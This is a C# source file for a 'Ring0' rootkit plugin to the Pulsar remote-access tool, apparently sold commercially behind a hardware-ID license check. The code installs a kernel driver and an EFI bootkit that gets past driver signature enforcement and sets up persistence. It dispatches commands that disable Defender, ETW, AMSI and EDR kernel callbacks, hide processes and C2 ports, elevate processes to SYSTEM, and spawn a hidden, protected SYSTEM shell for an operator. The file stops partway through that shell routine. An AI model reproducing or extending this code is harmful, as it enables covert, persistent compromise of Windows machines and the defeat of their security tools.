using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.IO;
using System.Reflection;
using Microsoft.Win32;
using Pulsar.Common.Plugins;
using Pulsar.Plugin.Ring0.Common;
using MessagePack;

namespace Pulsar.Plugin.Ring0.Client
{
    /// <summary>
    /// Chaos-Rootkit Ring0 Plugin Client
    /// Provides kernel rootkit functionality via Elysium bootkit DSE bypass
    /// </summary>
    public class Ring0ClientPlugin : IUniversalPlugin
    {
        // Static constructor to set up assembly resolver BEFORE any Common types are used
        static Ring0ClientPlugin()
        {
            AppDomain.CurrentDomain.AssemblyResolve += OnAssemblyResolve;
        }
        
        private static Assembly OnAssemblyResolve(object sender, ResolveEventArgs args)
        {
            // Only handle our Common assembly
            if (!args.Name.StartsWith("Pulsar.Plugin.Ring0.Common,"))
                return null;
                
            try
            {
                // Try to find it as an embedded resource
                var assembly = Assembly.GetExecutingAssembly();
                var resourceName = "Pulsar.Plugin.Ring0.Client.Pulsar.Plugin.Ring0.Common.dll";
                
                using (var stream = assembly.GetManifestResourceStream(resourceName))
                {
                    if (stream != null)
                    {
                        var assemblyData = new byte[stream.Length];
                        stream.Read(assemblyData, 0, assemblyData.Length);
                        return Assembly.Load(assemblyData);
                    }
                }
                
                // Fallback: try loading from same directory as executing assembly
                var assemblyPath = Path.Combine(
                    Path.GetDirectoryName(assembly.Location) ?? "",
                    "Pulsar.Plugin.Ring0.Common.dll");
                    
                if (File.Exists(assemblyPath))
                {
                    return Assembly.LoadFrom(assemblyPath);
                }
            }
            catch
            {
                // Failed to load - will throw FileNotFoundException
            }
            
            return null;
        }
        
        public string PluginId => Ring0Commands.PluginId;
        public string Version => Ring0Commands.PluginVersion;
        public const string CMD_ENABLE_TESTSIGNING = "enable-testsigning";
        public const string CMD_FULL_INSTALL = "full-install";
        
        public string[] SupportedCommands => new[]
        {
            Ring0Commands.CMD_CHECK_STATUS,
            Ring0Commands.CMD_CHECK_DSE,
            Ring0Commands.CMD_CHECK_SECURE_BOOT,
            Ring0Commands.CMD_INSTALL_ROOTKIT,
            Ring0Commands.CMD_UNINSTALL_ROOTKIT,
            Ring0Commands.CMD_CONNECT_ROOTKIT,
            Ring0Commands.CMD_HIDE_PROCESS,
            Ring0Commands.CMD_ELEVATE_PROCESS,
            Ring0Commands.CMD_SPAWN_ELEVATED,
            Ring0Commands.CMD_SET_PROTECTION,
            Ring0Commands.CMD_UNPROTECT_ALL,
            Ring0Commands.CMD_RESTRICT_FILE,
            Ring0Commands.CMD_BYPASS_INTEGRITY,
            Ring0Commands.CMD_PROTECT_FILE_AV,
            Ring0Commands.CMD_SWAP_DRIVER,
            Ring0Commands.CMD_DISABLE_DEFENDER, 
            CMD_ENABLE_TESTSIGNING,
            CMD_FULL_INSTALL,
            
            Ring0Commands.CMD_KILL_ETW,
            Ring0Commands.CMD_KILL_AMSI,
            Ring0Commands.CMD_KILL_PROCESS_CALLBACKS,
            Ring0Commands.CMD_KILL_THREAD_CALLBACKS,
            Ring0Commands.CMD_KILL_IMAGE_CALLBACKS,
            Ring0Commands.CMD_KILL_REGISTRY_CALLBACKS,
            Ring0Commands.CMD_KILL_ALL_CALLBACKS,
            Ring0Commands.CMD_UNLOAD_DRIVER,
            Ring0Commands.CMD_UNHOOK_SSDT,
            Ring0Commands.CMD_LIST_SSDT_HOOKS,
            // New Networking 
            Ring0Commands.CMD_HIDE_PORT,
            Ring0Commands.CMD_UNHIDE_PORT,
            Ring0Commands.CMD_HIDE_ALL_C2,
            Ring0Commands.CMD_ADD_DNS_RULE,
            Ring0Commands.CMD_REMOVE_DNS_RULE,
            Ring0Commands.CMD_LIST_DNS_RULES,
            Ring0Commands.CMD_BLOCK_IP,
            Ring0Commands.CMD_UNBLOCK_IP,
            Ring0Commands.CMD_LIST_BLOCKED,
            Ring0Commands.CMD_START_STEALTH_LISTENER,
            Ring0Commands.CMD_STOP_STEALTH_LISTENER
        };

        private bool _isComplete = false;
        public bool IsComplete => _isComplete;

        private ChaosDriver _driver;
        private StringBuilder _log;
        private byte[] _driverBytes;
        private byte[] _bootkitBytes;

        public void Initialize(object initData)
        {
            _log = new StringBuilder();
            
            // HWID License Check - Must pass before anything else
            #if !DEBUG
            if (!LicenseManager.ValidateOrActivate())
            {
                // Unauthorized machine - silent failure
                _isComplete = true;
                return;
            }
            #endif
            
            _driver = new ChaosDriver(Log);

            // initData may contain embedded driver/bootkit bytes
            if (initData is byte[] data && data.Length > 0)
            {
                // Format: [4 bytes driver len][driver bytes][bootkit bytes]
                if (data.Length > 4)
                {
                    int driverLen = BitConverter.ToInt32(data, 0);
                    if (driverLen > 0 && driverLen < data.Length - 4)
                    {
                        _driverBytes = new byte[driverLen];
                        Array.Copy(data, 4, _driverBytes, 0, driverLen);
                        
                        int bootkitLen = data.Length - 4 - driverLen;
                        if (bootkitLen > 0)
                        {
                            _bootkitBytes = new byte[bootkitLen];
                            Array.Copy(data, 4 + driverLen, _bootkitBytes, 0, bootkitLen);
                        }
                    }
                }
            }

            // Wire up bootkit installer logging
            BootkitInstaller.SetLogger(Log);

            // Try to connect if driver is already running
            if (_driver.IsDriverRunning())
            {
                _driver.Connect();
            }

            Log("RINGW0RM Plugin initialized");
        }

        /// <summary>
        /// Log a message - always visible to customer in release builds.
        /// Use SPARINGLY for essential status updates only.
        /// </summary>
        private void Log(string msg)
        {
            string line = $"[{DateTime.Now:HH:mm:ss.fff}] {msg}";
            _log?.AppendLine(line);
#if DEBUG
            Debug.WriteLine(line);
#endif
        }

        /// <summary>
        /// Log verbose/debug message - ONLY visible in DEBUG builds.
        /// Use for implementation details, IOCTL codes, internal state, etc.
        /// </summary>
        [System.Diagnostics.Conditional("DEBUG")]
        private void LogVerbose(string msg)
        {
#if DEBUG
            string line = $"[{DateTime.Now:HH:mm:ss.fff}] {msg}";
            _log?.AppendLine(line);
            Debug.WriteLine(line);
#endif
        }

        // ================================================================
        // CUSTOMER DEBUG LOGGING
        // Component-level logging visible in CUSTOMER_DEBUG builds.
        // Shows operation status without exposing sensitive internals.
        // ================================================================

        /// <summary>
        /// Log component operation status - visible in CUSTOMER_DEBUG builds.
        /// Provides component-level detail: "CreateService: OK, StartService: OK"
        /// </summary>
        [System.Diagnostics.Conditional("CUSTOMER_DEBUG")]
        private void LogComponent(string component, string operation, bool success, string detail = null)
        {
#if CUSTOMER_DEBUG
            string status = success ? "OK" : "FAIL";
            string msg = $"[{component}] {operation}: {status}";
            if (!string.IsNullOrEmpty(detail))
                msg += $" ({SanitizeLogMessage(detail)})";
            Log(msg);
#endif
        }

        /// <summary>
        /// Log error with sanitized details - visible in CUSTOMER_DEBUG builds.
        /// Removes sensitive internal details while providing useful debug info.
        /// </summary>
        [System.Diagnostics.Conditional("CUSTOMER_DEBUG")]
        private void LogError(string component, string operation, Exception ex)
        {
#if CUSTOMER_DEBUG
            // Generate a deterministic error code from the exception hash
            string errorCode = $"ERR-{Math.Abs(ex.GetHashCode()) % 10000:D4}";
            Log($"[{component}] {operation}: FAIL [{errorCode}]");
            Log($"  → {SanitizeLogMessage(ex.Message)}");
#endif
        }

        /// <summary>
        /// Sanitize log message to remove sensitive internal information.
        /// Removes IOCTL codes, memory addresses, device paths, full file paths.
        /// </summary>
        private string SanitizeLogMessage(string msg)
        {
            if (string.IsNullOrEmpty(msg)) return "";
            // Remove IOCTL/error codes (0x00000000 format)
            msg = System.Text.RegularExpressions.Regex.Replace(msg, @"0x[0-9A-Fa-f]{6,}", "[CODE]");
            // Remove memory addresses
            msg = System.Text.RegularExpressions.Regex.Replace(msg, @"0x[0-9A-Fa-f]{8,16}", "[ADDR]");
            // Remove device paths
            msg = System.Text.RegularExpressions.Regex.Replace(msg, @"\\\\\.\\[A-Z0-9]+", "[DEVICE]");
            // Abbreviate full file paths (keep just filename)
            msg = System.Text.RegularExpressions.Regex.Replace(msg, @"[A-Za-z]:\\[^\s]+\\([^\s\\]+)", "$1");
            return msg;
        }

        public PluginResult ExecuteCommand(string command, object parameters)
        {
            LogVerbose($"Command: {command}");

            try
            {
                byte[] paramBytes = parameters as byte[];

                switch (command)
                {
                    case Ring0Commands.CMD_CHECK_STATUS:
                        return CheckStatus();

                    case Ring0Commands.CMD_CHECK_DSE:
                        return CheckDSE();

                    case Ring0Commands.CMD_CHECK_SECURE_BOOT:
                        return CheckSecureBoot();

                    case Ring0Commands.CMD_CHECK_BOOTKIT:
                        return CheckBootkit();

                    case Ring0Commands.CMD_CHECK_ROOTKIT:
                        return CheckRootkit();

                    case Ring0Commands.CMD_START_ROOTKIT:
                        return StartRootkit();

                    case Ring0Commands.CMD_INSTALL_ROOTKIT:
                        return InstallRootkit(paramBytes);

                    case Ring0Commands.CMD_UNINSTALL_ROOTKIT:
                        return UninstallRootkit();

                    case Ring0Commands.CMD_CONNECT_ROOTKIT:
                        return ConnectRootkit();

                    case Ring0Commands.CMD_HIDE_PROCESS:
                        return HideProcess(paramBytes);

                    case Ring0Commands.CMD_ELEVATE_PROCESS:
                        return ElevateProcess(paramBytes);

                    case Ring0Commands.CMD_SPAWN_ELEVATED:
                        return SpawnElevated();

                    case Ring0Commands.CMD_SET_PROTECTION:
                        return SetProtection(paramBytes);

                    case Ring0Commands.CMD_UNPROTECT_ALL:
                        return UnprotectAll();

                    case Ring0Commands.CMD_RESTRICT_FILE:
                        return RestrictFile(paramBytes);

                    case Ring0Commands.CMD_BYPASS_INTEGRITY:
                        return BypassIntegrity(paramBytes);

                    case Ring0Commands.CMD_PROTECT_FILE_AV:
                        return ProtectFileAV(paramBytes);

                    case Ring0Commands.CMD_SWAP_DRIVER:
                        return SwapDriver();

                    case Ring0Commands.CMD_DISABLE_DEFENDER:
                        return DisableDefender();

                    case CMD_ENABLE_TESTSIGNING:
                        return EnableTestSigning();

                    case CMD_FULL_INSTALL:
                        return FullInstall(paramBytes);

                    // ================================================================
                    // AV/EDR BYPASS Commands
                    // ================================================================
                    case Ring0Commands.CMD_KILL_ETW:
                        return ExecuteKillEtw();
                    case Ring0Commands.CMD_KILL_AMSI:
                        return ExecuteKillAmsi(paramBytes);
                    case Ring0Commands.CMD_KILL_PROCESS_CALLBACKS:
                        return ExecuteKillProcessCallbacks();
                    case Ring0Commands.CMD_KILL_THREAD_CALLBACKS:
                        return ExecuteKillThreadCallbacks();
                    case Ring0Commands.CMD_KILL_IMAGE_CALLBACKS:
                        return ExecuteKillImageCallbacks();
                    case Ring0Commands.CMD_KILL_REGISTRY_CALLBACKS:
                        return ExecuteKillRegistryCallbacks();
                    case Ring0Commands.CMD_KILL_ALL_CALLBACKS:
                        return ExecuteKillAllCallbacks();
                    case Ring0Commands.CMD_UNLOAD_DRIVER:
                        return ExecuteUnloadDriver(paramBytes);
                    case Ring0Commands.CMD_UNHOOK_SSDT:
                        return ExecuteUnhookSsdt();
                    case Ring0Commands.CMD_LIST_SSDT_HOOKS:
                        return ExecuteListSsdtHooks();

                    // ================================================================
                    // NETWORKING Commands
                    // ================================================================
                    case Ring0Commands.CMD_HIDE_PORT:
                        return ExecuteHidePort(paramBytes);
                    case Ring0Commands.CMD_UNHIDE_PORT:
                        return ExecuteUnhidePort(paramBytes);
                    case Ring0Commands.CMD_HIDE_ALL_C2:
                        return ExecuteHideAllC2();
                    case Ring0Commands.CMD_ADD_DNS_RULE:
                        return ExecuteAddDnsRule(paramBytes);
                    case Ring0Commands.CMD_REMOVE_DNS_RULE:
                        return ExecuteRemoveDnsRule(paramBytes);
                    case Ring0Commands.CMD_LIST_DNS_RULES:
                        return ExecuteListDnsRules();
                    case Ring0Commands.CMD_BLOCK_IP:
                        return ExecuteBlockIp(paramBytes);
                    case Ring0Commands.CMD_UNBLOCK_IP:
                        return ExecuteUnblockIp(paramBytes);
                    case Ring0Commands.CMD_LIST_BLOCKED:
                        return ExecuteListBlocked();
                    case Ring0Commands.CMD_START_STEALTH_LISTENER:
                        return ExecuteStartStealthListener(paramBytes);
                    case Ring0Commands.CMD_STOP_STEALTH_LISTENER:
                        return ExecuteStopStealthListener();
                    case Ring0Commands.CMD_LIST_HIDDEN_PORTS:
                        return ExecuteListHiddenPorts();

                    // ================================================================
                    // POST-EXPLOITATION Commands
                    // ================================================================
                    case Ring0Commands.CMD_RUN_HIDDEN:
                        return ExecuteRunHidden(paramBytes);
                    case Ring0Commands.CMD_LIST_HIDDEN:
                        return ExecuteListHiddenProcesses();
                    case Ring0Commands.CMD_KILL_HIDDEN:
                        return ExecuteKillHidden(paramBytes);
                    case Ring0Commands.CMD_INJECT_PPL:
                        return ExecuteInjectPPL(paramBytes);
                    case Ring0Commands.CMD_CREATE_HIDDEN_TASK:
                        return ExecuteCreateHiddenTask(paramBytes);
                    case Ring0Commands.CMD_LIST_HIDDEN_TASKS:
                        return ExecuteListHiddenTasks();
                    case Ring0Commands.CMD_DELETE_HIDDEN_TASK:
                        return ExecuteDeleteHiddenTask(paramBytes);
                    case Ring0Commands.CMD_SPAWN_PPID:
                        return ExecuteSpawnPpid(paramBytes);
                    case Ring0Commands.CMD_UPLOAD_FILE:
                        return ExecuteUploadFile(paramBytes);

                    // ================================================================
                    // SYSTEM SHELL Commands
                    // ================================================================
                    case Ring0Commands.CMD_SHELL_START:
                        return ExecuteShellStart();
                    case Ring0Commands.CMD_SHELL_EXECUTE:
                        return ExecuteShellCommand(paramBytes);

                    // ================================================================
                    // BOOT PROTECTION Commands
                    // ================================================================
                    case Ring0Commands.CMD_CHECK_BOOT_STATUS:
                    case Ring0Commands.CMD_GET_BOOT_DIAGNOSTICS:
                        return ExecuteGetBootDiagnostics();
                    case Ring0Commands.CMD_ADD_FILE_TO_BOOTKIT:
                        return ExecuteAddFileToBootkit(paramBytes);
                    case Ring0Commands.CMD_REMOVE_FILE_FROM_BOOTKIT:
                        return ExecuteRemoveFileFromBootkit(paramBytes);
                    case Ring0Commands.CMD_LIST_BOOTKIT_FILES:
                        return ExecuteListBootkitFiles();

                    default:
                        return new PluginResult
                        {
                            Success = false,
                            Message = $"Unknown command: {command}"
                        };
                }
            }
            catch (Exception ex)
            {
                Log($"Error: {ex}");
                return new PluginResult
                {
                    Success = false,
                    Message = ex.Message,
                    Data = GetLogBytes()
                };
            }
        }

        #region Status Commands

        private PluginResult CheckStatus()
        {
            var status = SystemChecks.GetFullStatus(_driver);
            byte[] data = MessagePackSerializer.Serialize(status);

            return new PluginResult
            {
                Success = true,
                Message = status.Message,
                Data = data
            };
        }

        private PluginResult CheckDSE()
        {
            var dse = SystemChecks.CheckDSE();
            
            string msg = dse.DseEnabled 
                ? (dse.TestSigningEnabled ? "DSE: Test Signing Enabled" : "DSE: Enabled (bootkit required)")
                : "DSE: Disabled";
            
            if (dse.HvciEnabled)
                msg += " [HVCI Active]";

            return new PluginResult
            {
                Success = dse.Success,
                Message = msg,
                Data = BitConverter.GetBytes(dse.CodeIntegrityOptions)
            };
        }

        private PluginResult CheckSecureBoot()
        {
            var sb = SystemChecks.CheckSecureBoot();

            string msg = sb.SecureBootEnabled ? "Secure Boot: Enabled" : "Secure Boot: Disabled";
            if (sb.SecureBootCapable && !sb.SecureBootEnabled)
                msg += " (capable but off)";

            return new PluginResult
            {
                Success = sb.Success,
                Message = msg,
                Data = BitConverter.GetBytes(sb.SecureBootEnabled ? 1 : 0)
            };
        }

        private PluginResult CheckBootkit()
        {
            Log("Running bootkit diagnostics...");
            var diag = BootkitInstaller.GetDiagnostics();
            
            // Log each line of diagnostics
            foreach (var line in diag.ToString().Split('\n'))
            {
                if (!string.IsNullOrWhiteSpace(line))
                    Log(line.TrimEnd());
            }

            // Determine overall status
            bool fullyInstalled = diag.RegistryMarkerExists && 
                                  diag.BootkitFileExists && 
                                  diag.IsOurBootkit && 
                                  diag.OriginalBackupExists;

            string status;
            if (fullyInstalled)
                status = "Bootkit: INSTALLED and VERIFIED";
            else if (diag.RegistryMarkerExists && !diag.BootkitFileExists)
                status = "Bootkit: REGISTRY OK but FILE MISSING on EFI partition";
            else if (diag.BootkitFileExists && !diag.IsOurBootkit)
                status = "Bootkit: FILE EXISTS but is ORIGINAL (not our bootkit)";
            else if (!diag.OriginalBackupExists && diag.BootkitFileExists)
                status = "Bootkit: INSTALLED but NO BACKUP of original";
            else
                status = "Bootkit: NOT INSTALLED";

            return new PluginResult
            {
                Success = true,
                Message = status,
                Data = GetLogBytes()
            };
        }

        private PluginResult CheckRootkit()
        {
            Log("Running rootkit/driver diagnostics...");
            var diag = _driver.GetDiagnostics();
            
            // Log each line of diagnostics
            foreach (var line in diag.ToString().Split('\n'))
            {
                if (!string.IsNullOrWhiteSpace(line))
                    Log(line.TrimEnd());
            }

            // Determine overall status
            string status;
            if (diag.DeviceAccessible)
                status = "Rootkit: RUNNING and ACCESSIBLE";
            else if (diag.ServiceState == 4) // RUNNING
                status = "Rootkit: SERVICE RUNNING but DEVICE NOT ACCESSIBLE";
            else if (diag.ServiceExists && diag.DriverFileExists)
            {
                if (diag.DseEnabled && !diag.TestSigningEnabled)
                    status = $"Rootkit: INSTALLED but STOPPED (DSE blocking - needs reboot with bootkit)";
                else
                    status = $"Rootkit: INSTALLED but {diag.ServiceStateText} (error {diag.DeviceOpenError})";
            }
            else if (diag.DriverFileExists && !diag.ServiceExists)
                status = "Rootkit: DRIVER FILE EXISTS but SERVICE NOT REGISTERED";
            else
                status = "Rootkit: NOT INSTALLED";

            return new PluginResult
            {
                Success = true,
                Message = status,
                Data = GetLogBytes()
            };
        }

        private PluginResult StartRootkit()
        {
            Log("Starting rootkit driver...");
            
            // Check if driver is already running
            if (_driver.IsDriverRunning())
            {
                LogVerbose("Driver already running, connecting...");
                if (_driver.Connect())
                {
                    return new PluginResult
                    {
                        Success = true,
                        Message = "Driver already running - connected",
                        Data = GetLogBytes()
                    };
                }
            }

            // Try to start driver
            if (!_driver.StartDriver())
            {
                return new PluginResult
                {
                    Success = false,
                    Message = "Failed to start driver - check logs for error code",
                    Data = GetLogBytes()
                };
            }

            // Connect after starting
            if (_driver.Connect())
            {
                return new PluginResult
                {
                    Success = true,
                    Message = "Driver started and connected",
                    Data = GetLogBytes()
                };
            }

            return new PluginResult
            {
                Success = false,
                Message = "Driver started but connection failed",
                Data = GetLogBytes()
            };
        }

        #endregion

        #region Install/Connect Commands

        private PluginResult InstallRootkit(byte[] paramBytes)
        {
            // Check if we have driver bytes from init or params
            byte[] driverData = paramBytes ?? _driverBytes;
            byte[] bootkitData = _bootkitBytes;

            if (driverData == null || driverData.Length == 0)
            {
                return new PluginResult
                {
                    Success = false,
                    Message = "No driver data provided"
                };
            }

            LogVerbose($"Installing driver ({driverData.Length} bytes)...");

            // Check DSE status
            var dse = SystemChecks.CheckDSE();
            LogVerbose($"DSE Status: Enabled={dse.DseEnabled}, TestSigning={dse.TestSigningEnabled}, HVCI={dse.HvciEnabled}");
            
            if (dse.DseEnabled && !dse.TestSigningEnabled)
            {
                LogVerbose("DSE is enabled - installing as BOOT_START with test signing...");
                
                // Always install driver as Boot Start
                if (!_driver.InstallDriver(driverData, bootStart: true))
                {
                    return new PluginResult
                    {
                        Success = false,
                        Message = "Failed to install driver as Boot Start",
                        Data = GetLogBytes()
                    };
                }

                // Enable test signing
                var testSignResult = BootkitInstaller.EnableTestSigning();
                LogVerbose($"Test signing: {testSignResult.Message}");

                // Try bootkit if available and Secure Boot is off
                if (bootkitData != null && bootkitData.Length > 0)
                {
                    var sbStatus = SystemChecks.CheckSecureBoot();
                    if (!sbStatus.SecureBootEnabled)
                    {
                        LogVerbose("Installing Elysium bootkit...");
                        var bootkitResult = BootkitInstaller.InstallBootkit(bootkitData);
                        LogVerbose($"Bootkit: {bootkitResult.Message}");
                        
                        // CRITICAL: Configure payload persistence for auto-start
                        if (bootkitResult.Success)
                        {
                            LogVerbose("Configuring payload persistence...");
                            string payloadPath = GetPayloadPath();
                            if (!string.IsNullOrEmpty(payloadPath))
                            {
                                BootkitInstaller.ConfigurePayloadPersistencePublic(bootkitResult.EfiPath, payloadPath);
                                LogVerbose($"Persistence configured for: {payloadPath}");
                            }
                            else
                            {
                                Log("WARNING: Could not determine payload path for persistence");
                            }
                        }
                    }
                    else
                    {
                        LogVerbose("Secure Boot enabled - skipping bootkit, relying on test signing");
                    }
                }

                return new PluginResult
                {
                    Success = true,
                    Message = "Driver installed as Boot Start. Will load after bootkit patches DSE on reboot. (reboot required)",
                    Data = GetLogBytes()
                };
            }
            else
            {
                // DSE disabled or test signing enabled - can try direct load
                LogVerbose("DSE disabled or test signing on - attempting direct driver load...");
                
                if (_driver.InstallDriver(driverData, bootStart: false))
                {
                    LogVerbose("Driver installed, starting...");
                    if (_driver.StartDriver())
                    {
                        LogVerbose("Driver started, connecting...");
                        if (_driver.Connect())
                        {
                            Log("Connected to driver successfully!");
                            return new PluginResult
                            {
                                Success = true,
                                Message = "Driver installed and connected",
                                Data = GetLogBytes()
                            };
                        }
                    }
                }

                LogVerbose("Direct load failed - falling back to boot start...");
                // Fallback: install as boot start
                _driver.UninstallDriver();
                if (_driver.InstallDriver(driverData, bootStart: true))
                {
                    return new PluginResult
                    {
                        Success = true,
                        Message = "Driver installed as Boot Start. Reboot required.",
                        Data = GetLogBytes()
                    };
                }

                return new PluginResult
                {
                    Success = false,
                    Message = "Driver installation failed",
                    Data = GetLogBytes()
                };
            }
        }

        private PluginResult EnableTestSigning()
        {
            LogVerbose("Enabling test signing mode...");
            var result = BootkitInstaller.EnableTestSigning();
            
            return new PluginResult
            {
                Success = result.Success,
                Message = result.Message,
                Data = GetLogBytes()
            };
        }

        private PluginResult FullInstall(byte[] paramBytes)
        {
            byte[] driverData = paramBytes ?? _driverBytes;
            byte[] bootkitData = _bootkitBytes;

            if (driverData == null || driverData.Length == 0)
            {
                return new PluginResult
                {
                    Success = false,
                    Message = "No driver data provided"
                };
            }

            LogVerbose("Starting full installation (driver + test signing + bootkit)...");
            var result = BootkitInstaller.FullInstall(bootkitData, driverData, _driver);

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Message,
                Data = GetLogBytes()
            };
        }

        private PluginResult UninstallRootkit()
        {
            var sb = new StringBuilder();
            bool overallSuccess = true;
            bool needsReboot = false;

            LogVerbose("=== Starting Full Uninstall ===");

            // Step 1: Disconnect from driver
            if (_driver.IsConnected)
            {
                LogVerbose("Disconnecting from driver...");
                _driver.Disconnect();
            }

            // Step 2: Uninstall driver service
            LogVerbose("Uninstalling driver...");
            bool driverSuccess = _driver.UninstallDriver();
            if (driverSuccess)
            {
                sb.AppendLine("✓ Driver uninstalled");
            }
            else
            {
                sb.AppendLine("⚠ Driver uninstall incomplete (may need reboot)");
                needsReboot = true;
            }

            // Step 3: Uninstall bootkit (restore original boot manager)
            LogVerbose("Checking for bootkit...");
            if (BootkitInstaller.IsBootkitInstalled())
            {
                LogVerbose("Uninstalling bootkit...");
                var bootkitResult = BootkitInstaller.UninstallBootkit();
                if (bootkitResult.Success)
                {
                    sb.AppendLine("✓ Bootkit uninstalled");
                    needsReboot = true;
                }
                else
                {
                    sb.AppendLine($"⚠ Bootkit: {bootkitResult.Message}");
                    Log($"Bootkit uninstall warning: {bootkitResult.Message}");
                }
            }
            else
            {
                sb.AppendLine("○ No bootkit installed");
            }

            // Step 4: Disable test signing
            LogVerbose("Disabling test signing...");
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "bcdedit.exe",
                    Arguments = "/set testsigning off",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                using (var proc = Process.Start(psi))
                {
                    proc.WaitForExit(5000);
                    if (proc.ExitCode == 0)
                    {
                        sb.AppendLine("✓ Test signing disabled");
                        LogVerbose("Test signing disabled");
                        needsReboot = true;
                    }
                    else
                    {
                        sb.AppendLine("○ Test signing not modified");
                    }
                }
            }
            catch (Exception ex)
            {
                Log($"Test signing disable failed: {ex.Message}");
            }

            // Step 5: Clean up Elysium registry marker
            try
            {
                Registry.LocalMachine.DeleteSubKey(@"SOFTWARE\Microsoft\Elysium", false);
                LogVerbose("Elysium registry key removed");
            }
            catch { }

            if (needsReboot)
            {
                sb.AppendLine("\n⚡ Reboot required to complete uninstall");
            }

            LogVerbose("=== Uninstall Complete ===");

            return new PluginResult
            {
                Success = overallSuccess,
                Message = sb.ToString().TrimEnd(),
                Data = GetLogBytes()
            };
        }

        private PluginResult ConnectRootkit()
        {
            if (_driver.IsConnected)
            {
                return new PluginResult
                {
                    Success = true,
                    Message = "Already connected"
                };
            }

            if (!_driver.IsDriverRunning())
            {
                // Try to start it
                if (!_driver.StartDriver())
                {
                    return new PluginResult
                    {
                        Success = false,
                        Message = "Driver not running and failed to start"
                    };
                }
            }

            bool connected = _driver.Connect();
            return new PluginResult
            {
                Success = connected,
                Message = connected ? "Connected to RINGW0RM-Rootkit" : "Connection failed"
            };
        }

        #endregion

        #region Rootkit Feature Commands

        private PluginResult HideProcess(byte[] paramBytes)
        {
            Log("[HIDE_PROCESS] Starting...");
            
            // Distributed license check - silent failure
#if !DEBUG
            if (!LicenseManager.QuickCheck())
            {
                Log("[HIDE_PROCESS] Internal check failed");
                return new PluginResult { Success = false, Message = "Operation unavailable", Data = GetLogBytes() };
            }
#endif
            
            if (!EnsureConnected(out PluginResult error))
            {
                Log($"[HIDE_PROCESS] Not connected: {error.Message}");
                return error;
            }

            int pid = GetPidFromParams(paramBytes);
            Log($"[HIDE_PROCESS] Target PID: {pid}");
            
            if (pid <= 0)
            {
                Log("[HIDE_PROCESS] Invalid PID");
                return new PluginResult { Success = false, Message = "Invalid PID", Data = GetLogBytes() };
            }

            var result = _driver.HideProcess(pid);
            Log($"[HIDE_PROCESS] Result: Success={result.Success}, Error={result.ErrorCode}, Msg={result.Message}");
            
            return new PluginResult
            {
                Success = result.Success,
                Message = result.Success ? $"Process {pid} hidden successfully" : $"Hide failed: {result.Message} (error {result.ErrorCode})",
                Data = GetLogBytes()
            };
        }

        private PluginResult ElevateProcess(byte[] paramBytes)
        {
            Log("[ELEVATE_PROCESS] Starting...");
            
            // Distributed license check - silent failure
#if !DEBUG
            if (!LicenseManager.QuickCheck())
            {
                Log("[ELEVATE_PROCESS] Internal check failed");
                return new PluginResult { Success = false, Message = "Operation unavailable", Data = GetLogBytes() };
            }
#endif
            
            if (!EnsureConnected(out PluginResult error))
            {
                Log($"[ELEVATE_PROCESS] Not connected: {error.Message}");
                return error;
            }

            int pid = GetPidFromParams(paramBytes);
            Log($"[ELEVATE_PROCESS] Target PID: {pid}");
            
            if (pid <= 0)
            {
                Log("[ELEVATE_PROCESS] Invalid PID");
                return new PluginResult { Success = false, Message = "Invalid PID", Data = GetLogBytes() };
            }

            var result = _driver.ElevateProcess(pid);
            Log($"[ELEVATE_PROCESS] Result: Success={result.Success}, Error={result.ErrorCode}, Msg={result.Message}");
            
            return new PluginResult
            {
                Success = result.Success,
                Message = result.Success ? $"Process {pid} elevated to SYSTEM" : $"Elevate failed: {result.Message} (error {result.ErrorCode})",
                Data = GetLogBytes()
            };
        }

        private PluginResult SpawnElevated()
        {
            Log("[SPAWN_ELEVATED] Starting - Creating SYSTEM-elevated shell for operator...");
            
            if (!EnsureConnected(out PluginResult error))
            {
                Log($"[SPAWN_ELEVATED] Not connected: {error.Message}");
                return error;
            }

            try
            {
                // Step 1: Start cmd.exe process (hidden, for shell operations)
                Log("[SPAWN_ELEVATED] Starting cmd.exe process...");
                var psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                    UseShellExecute = false,
                    CreateNoWindow = true,  // Hidden - will be controlled via Pulsar Remote Shell
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                
                var proc = Process.Start(psi);
                if (proc == null)
                {
                    Log("[SPAWN_ELEVATED] Failed to start cmd.exe");
                    return new PluginResult
                    {
                        Success = false,
                        Message = "Failed to start cmd.exe process",
                        Data = GetLogBytes()
                    };
                }
                
                int cmdPid = proc.Id;
                Log($"[SPAWN_ELEVATED] cmd.exe started with PID {cmdPid}");
                
                // Step 2: Elevate cmd.exe to SYSTEM using kernel driver
                Log($"[SPAWN_ELEVATED] Elevating cmd.exe (PID {cmdPid}) to SYSTEM...");
                var elevResult = _driver.ElevateProcess(cmdPid);
                if (elevResult.Success)
                {
                    Log($"[SPAWN_ELEVATED] cmd.exe (PID {cmdPid}) successfully elevated to SYSTEM");
                }
                else
                {
                    Log($"[SPAWN_ELEVATED] Failed to elevate cmd.exe: {elevResult.Message}");
                    // Kill the process since elevation failed
                    try { proc.Kill(); } catch { }
                    return new PluginResult
                    {
                        Success = false,
                        Message = $"Failed to elevate cmd.exe: {elevResult.Message}",
                        Data = GetLogBytes()
                    };
                }
                
                // Step 3: Apply Antimalware Light protection to hide from EDR
                Log($"[SPAWN_ELEVATED] Applying AM Light protection to cmd.exe...");
                var protResult = _driver.SetProtection(cmdPid, ProtectionType.Light, ProtectionSigner.Antimalware);
                if (protResult.Success)
                {
                    Log($"[SPAWN_ELEVATED] cmd.exe protected with Antimalware Light");
                }
                else
                {
                    Log($"[SPAWN_ELEVATED] Warning: Could not apply protection: {protResult.Message}");
                }
                
                // Step 4: Hide cmd.exe from Task Manager using DKOM
                Log($"[SPAWN_ELEVATED] Hiding cmd.exe (PID {cmdPid}) from process list...");
                var hideResult = _driver.HideProcess(cmdPid);
                if (hideResult.Success)
                {
                    Log($"[SPAWN_ELEVATED] cmd.exe hidden from process enumeration");
                }
                else
                {
                    Log($"[SPAWN_ELEVATED] Warning: Could not hide process: {hideResult.Message}");
                }
                
                // Keep process reference for cleanup
                // Note: The actual shell interaction should happen via Pulsar's Remote Shell feature
                // which connects to the existing RemoteShellHandler on the client
                
